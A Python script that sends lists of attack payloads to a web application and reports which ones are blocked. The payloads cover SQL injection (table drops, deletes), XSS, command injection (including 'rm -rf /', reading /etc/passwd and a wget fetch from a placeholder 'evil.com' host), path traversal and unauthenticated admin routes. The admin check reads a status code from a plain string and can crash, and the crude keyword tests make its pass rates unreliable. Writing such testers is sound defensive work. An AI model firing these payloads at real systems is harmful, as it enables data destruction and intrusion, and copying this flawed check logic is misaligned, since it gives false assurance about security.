#!/usr/bin/env python3
"""
Production Security Testing Script
Tests security measures in the running application
"""

import requests
import json
import time
import sys
from typing import Dict, List, Tuple

class ProductionSecurityTester:
    def __init__(self, base_url: str = "http://localhost:8501"):
        self.base_url = base_url
        self.test_results = []
        
    def test_endpoint(self, endpoint: str, method: str = "GET", data: Dict = None) -> Tuple[bool, str]:
        """Test a specific endpoint with given data"""
        try:
            url = f"{self.base_url}{endpoint}"
            
            if method.upper() == "GET":
                response = requests.get(url, timeout=10)
            elif method.upper() == "POST":
                response = requests.post(url, json=data, timeout=10)
            else:
                return False, f"Unsupported method: {method}"
                
            return True, f"Status: {response.status_code}, Response: {response.text[:200]}"
            
        except requests.exceptions.RequestException as e:
            return False, f"Request failed: {str(e)}"
    
    def test_sql_injection(self) -> List[Dict]:
        """Test SQL injection protection"""
        print("🔍 Testing SQL Injection Protection...")
        
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "1'; DELETE FROM users; --",
            "admin'--",
            "admin' OR '1'='1'--"
        ]
        
        results = []
        for payload in sql_payloads:
            success, response = self.test_endpoint("/", "POST", {"query": payload})
            results.append({
                "payload": payload,
                "success": success,
                "response": response,
                "blocked": "error" in response.lower() or "blocked" in response.lower()
            })
            
        return results
    
    def test_xss_protection(self) -> List[Dict]:
        """Test XSS protection"""
        print("🔍 Testing XSS Protection...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        results = []
        for payload in xss_payloads:
            success, response = self.test_endpoint("/", "POST", {"query": payload})
            results.append({
                "payload": payload,
                "success": success,
                "response": response,
                "blocked": "<script>" not in response and "alert(" not in response
            })
            
        return results
    
    def test_command_injection(self) -> List[Dict]:
        """Test command injection protection"""
        print("🔍 Testing Command Injection Protection...")
        
        cmd_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; wget http://evil.com/malware"
        ]
        
        results = []
        for payload in cmd_payloads:
            success, response = self.test_endpoint("/", "POST", {"query": payload})
            results.append({
                "payload": payload,
                "success": success,
                "response": response,
                "blocked": "error" in response.lower() or "blocked" in response.lower()
            })
            
        return results
    
    def test_path_traversal(self) -> List[Dict]:
        """Test path traversal protection"""
        print("🔍 Testing Path Traversal Protection...")
        
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in path_payloads:
            success, response = self.test_endpoint("/", "POST", {"query": payload})
            results.append({
                "payload": payload,
                "success": success,
                "response": response,
                "blocked": "error" in response.lower() or "blocked" in response.lower()
            })
            
        return results
    
    def test_admin_authentication(self) -> List[Dict]:
        """Test admin authentication"""
        print("🔍 Testing Admin Authentication...")
        
        # Test accessing admin routes without authentication
        admin_routes = [
            "/admin",
            "/admin/dashboard",
            "/admin/users",
            "/admin/settings"
        ]
        
        results = []
        for route in admin_routes:
            success, response = self.test_endpoint(route)
            results.append({
                "route": route,
                "success": success,
                "response": response,
                "protected": "login" in response.lower() or "unauthorized" in response.lower() or response.status_code == 401
            })
            
        return results
    
    def run_all_tests(self) -> Dict:
        """Run all security tests"""
        print("🚀 Starting Production Security Tests...")
        print(f"Testing application at: {self.base_url}")
        print("=" * 50)
        
        all_results = {
            "sql_injection": self.test_sql_injection(),
            "xss_protection": self.test_xss_protection(),
            "command_injection": self.test_command_injection(),
            "path_traversal": self.test_path_traversal(),
            "admin_authentication": self.test_admin_authentication()
        }
        
        return all_results
    
    def print_results(self, results: Dict):
        """Print test results in a formatted way"""
        print("\n" + "=" * 50)
        print("🔒 SECURITY TEST RESULTS")
        print("=" * 50)
        
        for test_name, test_results in results.items():
            print(f"\n📋 {test_name.upper().replace('_', ' ')}")
            print("-" * 30)
            
            if not test_results:
                print("❌ No results")
                continue
                
            blocked_count = sum(1 for result in test_results if result.get("blocked", False))
            total_count = len(test_results)
            
            print(f"✅ Blocked: {blocked_count}/{total_count} ({blocked_count/total_count*100:.1f}%)")
            
            for result in test_results:
                status = "✅ BLOCKED" if result.get("blocked", False) else "❌ ALLOWED"
                print(f"  {status}: {result.get('payload', result.get('route', 'Unknown'))}")
                
        print("\n" + "=" * 50)
        print("🎯 SUMMARY")
        print("=" * 50)
        
        total_tests = sum(len(test_results) for test_results in results.values())
        total_blocked = sum(
            sum(1 for result in test_results if result.get("blocked", False))
            for test_results in results.values()
        )
        
        print(f"Total Tests: {total_tests}")
        print(f"Successfully Blocked: {total_blocked}")
        print(f"Success Rate: {total_blocked/total_tests*100:.1f}%")
        
        if total_blocked == total_tests:
            print("🎉 All security tests PASSED!")
        elif total_blocked >= total_tests * 0.8:
            print("⚠️  Most security tests passed, but some improvements needed")
        else:
            print("🚨 Security tests FAILED - immediate attention required!")

def main():
    """Main function to run security tests"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Test security measures in production")
    parser.add_argument("--url", default="http://localhost:8501", 
                       help="Base URL of the application (default: http://localhost:8501)")
    parser.add_argument("--test", choices=["all", "sql", "xss", "cmd", "path", "admin"],
                       default="all", help="Specific test to run")
    
    args = parser.parse_args()
    
    tester = ProductionSecurityTester(args.url)
    
    if args.test == "all":
        results = tester.run_all_tests()
    else:
        # Run specific test
        if args.test == "sql":
            results = {"sql_injection": tester.test_sql_injection()}
        elif args.test == "xss":
            results = {"xss_protection": tester.test_xss_protection()}
        elif args.test == "cmd":
            results = {"command_injection": tester.test_command_injection()}
        elif args.test == "path":
            results = {"path_traversal": tester.test_path_traversal()}
        elif args.test == "admin":
            results = {"admin_authentication": tester.test_admin_authentication()}
    
    tester.print_results(results)

if __name__ == "__main__":
    main()
